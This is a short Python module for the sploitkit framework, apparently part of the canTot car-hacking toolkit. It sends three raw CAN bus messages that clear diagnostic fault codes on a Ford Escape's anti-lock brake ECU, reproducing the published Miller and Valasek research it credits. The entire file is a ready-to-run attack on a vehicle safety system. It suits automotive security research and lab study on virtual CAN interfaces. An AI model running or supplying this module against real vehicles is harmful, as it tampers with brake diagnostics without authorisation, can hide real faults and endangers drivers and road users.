from sploitkit import *
import can
import time

class ford_escape_diagnostic_packets(Module):
    """ This module will clear the fault codes between a diagnostic tool and the anti-lock brake (ABS) ECU for Ford Escape.

    Author:  shipcod3 # canTot module
    Credits: Charlie Miller and Chris Valasek # Original Research
    Reference: https://ioactive.com/pdfs/IOActive_Adventures_in_Automotive_Networks_and_Control_Units.pdf
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        bus = can.interface.Bus(bustype="socketcan", channel=self.config.option('INTERFACE').value)
        try:
            print("[*] Sending diagnostic packets to clear the fault codes between a diagnostic tool and the anti-lock brake (ABS) ECU")
            msg1 = can.Message(arbitration_id=0x0760, data=[0x03,0x14,0xFF,0x0,0x0,0x0,0x0,0x0], is_extended_id=False)
            bus.send(msg1)

            msg2 = can.Message(arbitration_id=0x0768, data=[0x03,0x7F,0x14,0x78,0x0,0x0,0x0,0x0], is_extended_id=False)
            bus.send(msg2)

            msg3 = can.Message(arbitration_id=0x0768, data=[0x03,0x54,0xFF,0x0,0x0,0x0,0x0,0x0], is_extended_id=False)
            bus.send(msg3)    
        except:
            print("Messages not sent. Module failed!")
